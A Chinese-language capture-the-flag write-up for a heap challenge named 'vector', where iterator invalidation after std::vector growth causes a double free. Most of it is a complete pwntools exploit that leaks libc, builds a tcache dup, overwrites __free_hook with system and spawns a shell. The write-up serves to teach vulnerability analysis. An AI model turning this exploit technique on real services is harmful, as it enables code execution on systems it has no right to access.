# vector

## 题目简述

题目实现了一个基于 C++ `std::vector` 的 note 管理器。在遍历容器的过程中，复制功能会继续扩张同一个 `vector`，扩容后原有迭代器失效，后续仍按旧迭代器操作，最终造成同一 note 被重复释放。利用该 double free 可以泄露 libc、污染 tcache，并把 `__free_hook` 改为 `system`。

## 解题过程

`std::vector` 容量不足时会申请更大的连续空间、移动原元素并释放旧存储。所有指向旧存储的迭代器、指针和引用都会失效。题目在遍历过程中调用复制逻辑并改变容器大小，却继续使用扩容前的迭代器，因此能让同一个堆对象进入释放流程两次。

利用分为三步。

第一步先填充并清空对应 size 的 tcache，再让一个较大的 chunk 进入 unsorted bin。重新从它切分小块后，`show` 泄露残留的 main arena 指针，据提供的 libc 计算基址：

```python
libc.address = leak - libc.sym["__malloc_hook"] - 0x170
```

第二步重新布置 `0x70` 大小的 note，并调用 `copy_note(2, 17)`。目标下标迫使 `vector` 扩容，失效迭代器触发 double free；配合后续释放顺序构造 tcache dup。

第三步把重复 chunk 的 forward 指针改为 `__free_hook`，依次申请直到分配结果落到 hook 上，写入 `system`，最后释放保存 `/bin/sh\x00` 的 note。

整理成 Python 3 后的完整利用如下。远程地址和端口应替换为当前部署信息；偏移必须使用题目提供的 `libc.so.6`，不能套用本机 libc：

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

context.log_level = "info"

HOST = "challenge.example"
PORT = 0

libc = ELF("./libc.so.6", checksec=False)
io = remote(HOST, PORT)

# Proof of Work
io.recvuntil(b") == ")
target_hash = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == target_hash,
    string.printable,
    4,
    method="fixed",
)
if proof is None:
    raise RuntimeError("PoW 求解失败")
io.sendlineafter(b"????> ", proof.encode())


def add(index, size, content):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"index?\n>> ", str(index).encode())
    io.sendlineafter(b"size?\n>> ", str(size).encode())
    io.sendafter(b"content?\n", content)


def show(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"index?\n>> ", str(index).encode())


def delete(index):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b"index?\n>> ", str(index).encode())


def copy_note(source_index, target_index):
    io.sendlineafter(b">> ", b"5")
    for _ in range(source_index):
        io.sendlineafter(b"[1/0]\n>> ", b"0")
    io.sendlineafter(b"[1/0]\n>> ", b"1")
    io.sendlineafter(b">>", str(target_index).encode())


# 填满 0x110 tcache，并准备 unsorted-bin 泄露。
for i in range(8):
    add(i, 0x100, f"idx:{i}\n".encode())

for i in range(8, 10):
    add(i, 0x70, f"idx:{i}\n".encode())

for i in range(1, 8):
    delete(i)

delete(0)
add(0, 0x50, b"aaaaaaaa")
show(0)
io.recvuntil(b"aaaaaaaa")
leak = u64(io.recvn(6).ljust(8, b"\x00"))

libc.address = leak - libc.sym["__malloc_hook"] - 0x170
system = libc.sym["system"]
free_hook = libc.sym["__free_hook"]
log.success(f"libc base = {libc.address:#x}")

# 制造 vector 扩容后的迭代器失效与 double free。
for i in range(1, 8):
    add(i, 0x70, f"idx:{i}\n".encode())

copy_note(2, 17)
add(10, 0x70, b"idx:10")

for i in range(3, 10):
    delete(i)

delete(2)
delete(10)
delete(17)

# 消耗 tcache，并把重复 chunk 的 fd 改到 __free_hook。
for i in range(2, 9):
    add(i, 0x70, b"\n")

add(9, 0x70, p64(free_hook))
add(11, 0x70, b"pass\n")
add(12, 0x70, b"/bin/sh\x00\n")
add(13, 0x70, p64(system))

delete(12)
io.interactive()
```

`delete(12)` 最终等价于 `system("/bin/sh")`，进入交互 shell 后读取题目环境中的 flag 文件即可。

## 方法总结

本题的根因是把 `vector` 扩容当成普通插入操作，忽略了它会整体搬迁底层存储并使迭代器失效。利用层面先通过 unsorted bin 获得 libc，再把 double free 转换成 tcache dup，最后覆盖 `__free_hook`。审计 C++ 容器代码时，凡是遍历期间可能触发 `push_back`、`insert`、`resize` 或间接扩容的路径，都必须重新确认迭代器和元素地址是否仍然有效。
